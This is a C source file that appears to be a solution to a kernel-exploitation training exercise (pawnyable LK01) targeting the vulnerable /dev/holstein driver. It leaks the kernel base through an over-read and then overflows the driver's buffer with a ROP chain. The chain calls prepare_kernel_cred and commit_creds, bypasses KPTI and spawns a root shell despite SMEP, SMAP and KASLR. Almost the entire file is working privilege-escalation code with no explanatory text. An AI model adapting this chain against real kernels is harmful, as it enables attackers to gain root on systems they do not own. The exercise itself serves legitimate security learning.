/**
 * kaslr:
 *   - SMEP is enabled
 *   - SMAP is enabled
 *   - KPTI is enabled
 *   - KASLR is enabled
 * 
 * [1] https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;
#define prepare_kernel_cred (kbase + 0x6e240)
#define commit_creds        (kbase + 0x6e390)
#define rop_pop_rdi               (kbase + 0x27bbdc)
#define rop_pop_rcx               (kbase + 0x32cdd3)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x60c96b)
#define rop_bypass_kpti           (kbase + 0x800e26)

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  save_state();

  char buf[0x500];
  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1) fatal("open(\"/dev/holstein\")");

  /* Leak kernel base */
  memset(buf, 'B', 0x480);
  read(fd, buf, 0x410);
  unsigned long addr_vfs_read = *(unsigned long*)&buf[0x408];
  unsigned long kbase = addr_vfs_read - (0xffffffff8113d33c-0xffffffff81000000);
  printf("[+] kbase = 0x%016lx\n", kbase);

  /* kROP */
  memset(buf, 'A', 0x408);
  unsigned long *chain = (unsigned long*)&buf[0x408];
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef; // [rdi]
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win; // [rdi+0x10]
  *chain++ = user_cs;             // [rdi+0x18]
  *chain++ = user_rflags;         // [rdi+0x20]
  *chain++ = user_rsp;            // [rdi+0x28]
  *chain++ = user_ss;             // [rdi+0x30]
  write(fd, buf, (void*)chain - (void*)buf);

  close(fd);
  return 0;
}
